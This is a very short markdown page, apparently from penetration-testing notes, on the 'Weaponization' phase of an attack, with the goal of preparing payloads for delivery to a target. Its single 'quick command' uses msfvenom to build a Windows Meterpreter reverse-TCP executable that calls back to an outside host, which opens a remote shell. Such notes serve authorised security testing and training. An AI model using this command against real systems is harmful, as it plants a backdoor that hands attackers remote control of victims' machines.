---
title: web
hide:
  - toc
---

# Weaponization

## Goal
Prepare exploit code and payloads that will be delivered to the target.

## Quick commands
- Placeholder command for payload build:
  ```bash
  msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.2 LPORT=443 -f exe -o payload.exe
